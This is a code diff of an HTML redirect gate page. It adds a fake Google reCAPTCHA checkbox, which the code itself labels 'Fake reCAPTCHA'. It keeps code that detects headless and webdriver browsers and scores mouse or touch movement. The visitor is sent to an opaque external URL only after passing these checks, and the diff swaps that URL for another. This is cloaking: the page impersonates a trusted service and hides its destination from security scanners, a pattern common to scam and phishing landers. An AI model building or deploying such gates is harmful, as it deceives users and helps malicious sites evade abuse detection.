@@ -1,30 +1,29 @@
 <!DOCTYPE html>
-<html lang="nl">
+<html lang="en">
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <meta name="referrer" content="no-referrer" />
-<title>Doorgaan</title>
+<title>Continue</title>
 
 <style>
   body{
     margin:0;
     font-family: Arial, sans-serif;
-    background:#f5f5f7;
+
+    background-image: url("YOUR_IMAGE_URL");
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+
     height:100vh;
     display:flex;
     align-items:center;
     justify-content:center;
     text-align:center;
   }
-  .box{
-    background:white;
-    padding:28px;
-    width:100%;
-    max-width:480px;
-    border-radius:12px;
-    box-shadow:0 8px 35px rgba(0,0,0,0.09);
-  }
+
+  
   .spinner{
     width:48px;
     height:48px;
@@ -35,8 +34,9 @@
     margin:20px auto;
   }
   @keyframes spin{ to{transform:rotate(360deg);} }
+
   .btn{
-    margin-top:10px;
+    margin-top:15px;
     padding:12px 22px;
     background:#007bff;
     color:white;
@@ -47,30 +47,91 @@
     font-weight:600;
   }
   .btn[disabled]{ background:#b8cfff; cursor:not-allowed; }
+
   .warning{ margin-top:12px; color:#b33; display:none; }
+
+  /* ------- Fake reCAPTCHA ------- */
+  .captcha-box{
+    width:100%;
+    border:1px solid #dcdcdc;
+    border-radius:10px;
+    padding:12px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    margin-top:10px;
+    user-select:none;
+  }
+  .captcha-left{
+    display:flex;
+    align-items:center;
+    gap:10px;
+  }
+  .captcha-checkbox{
+    width:22px;
+    height:22px;
+    border:2px solid #999;
+    border-radius:3px;
+    cursor:pointer;
+    position:relative;
+  }
+  .captcha-checkbox.checked{
+    border-color:#4CAF50;
+    background:#4CAF50;
+  }
+  .captcha-checkbox.checked::after{
+    content:"✓";
+    color:white;
+    font-size:18px;
+    position:absolute;
+    top:-3px;
+    left:3px;
+  }
+  .captcha-text{
+    font-size:15px;
+    color:#333;
+  }
+  .captcha-right{
+    font-size:10px;
+    text-align:right;
+    color:#888;
+  }
 </style>
 </head>
 
 <body>
 <div class="box">
+
+    <!-- reCAPTCHA FAKE -->
+    <div class="captcha-box">
+      <div class="captcha-left">
+        <div id="captchaCheck" class="captcha-checkbox"></div>
+        <div class="captcha-text">I'm not a robot</div>
+      </div>
+      <div class="captcha-right">
+        reCAPTCHA<br>Privacy - Terms
+      </div>
+    </div>
+
     <div class="spinner"></div>
-    <button class="btn" disabled id="goBtn">Doorgaan</button>
+    <button class="btn" disabled id="goBtn">Continue</button>
     <div class="warning" id="warn"></div>
 </div>
 
 <script>
 (function(){
 
-  const TARGET = "https://www.therebths.com/9HF976T/2RCP16WK/";
-  const goBtn = document.getElementById("goBtn");
-  const warn  = document.getElementById("warn");
+  const TARGET = "https://www.wonprises.com/DQ7MW8/6WH2ZX2/";
+  const goBtn   = document.getElementById("goBtn");
+  const warn    = document.getElementById("warn");
+  const capBox  = document.getElementById("captchaCheck");
 
   let interacted = false;
   let movementScore = 0;
   let chaosScore = 0;
   let interactionTime = null;
+  let captchaOK = false;
 
-  // ❌ Blokkeer headless / webdriver
   function envSuspicious(){
     const ua = navigator.userAgent;
     if (navigator.webdriver) return true;
@@ -78,64 +139,59 @@
     return false;
   }
 
-  // 🧠 Complexe menselijke score evaluatie
   function evaluateHumanity(){
     const elapsed = Date.now() - interactionTime;
-
-    // moet minstens 500ms muis of aanraking
     if (elapsed < 500) return false;
-
-    // natuurlijke menselijke willekeur
     if (movementScore < 12) return false;
     if (chaosScore < 4) return false;
-
     return true;
   }
 
-  function recordMouseMove(e){
-    interacted = true;
-
-    if (!interactionTime) interactionTime = Date.now();
-
-    movementScore++;
-
-    // chaos bijhouden
-    const randomness = Math.random() * e.movementX + Math.random() * e.movementY;
-    if (randomness % 3 !== 0) chaosScore++;
-  }
-
-  // aanraking detectie
-  function recordTouch(e){
-    interacted = true;
-
-    if (!interactionTime) interactionTime = Date.now();
-
-    movementScore++;
-
-    if (e.touches && e.touches[0]){
-      const p = e.touches[0].force || 0.2; // veel apparaten geven 0 → behandel als laag
-      if (p > 0.15 && p < 0.9) chaosScore++;
+  function updateButton(){
+    if (captchaOK && interacted && evaluateHumanity()){
+      goBtn.disabled = false;
     }
   }
 
-  // controleer elke 250ms
+  capBox.onclick = () => {
+    captchaOK = true;
+    capBox.classList.add("checked");
+    updateButton();
+  };
+
+  function recordMouseMove(e){
+    interacted = true;
+    if (!interactionTime) interactionTime = Date.now();
+    movementScore++;
+    const randomness = Math.random() * e.movementX + Math.random() * e.movementY;
+    if (randomness % 3 !== 0) chaosScore++;
+    updateButton();
+  }
+
+  function recordTouch(e){
+    interacted = true;
+    if (!interactionTime) interactionTime = Date.now();
+    movementScore++;
+    if (e.touches && e.touches[0]){
+      const p = e.touches[0].force || 0.2;
+      if (p > 0.15 && p < 0.9) chaosScore++;
+    }
+    updateButton();
+  }
+
   setInterval(()=>{
     if (envSuspicious()){
       warn.style.display = "block";
-      warn.textContent = "Verdachte browseromgeving gedetecteerd.";
+      warn.textContent = "Suspicious browser environment detected.";
       return;
     }
-
-    if (interacted && evaluateHumanity()){
-      goBtn.disabled = false;
-    }
+    updateButton();
   }, 250);
 
   goBtn.onclick = () => {
     if (!goBtn.disabled) window.location.href = TARGET;
   };
 
-  // event listeners
   window.addEventListener("mousemove", recordMouseMove, {passive:true});
   window.addEventListener("touchstart", recordTouch, {passive:true});
   window.addEventListener("touchmove", recordTouch, {passive:true});
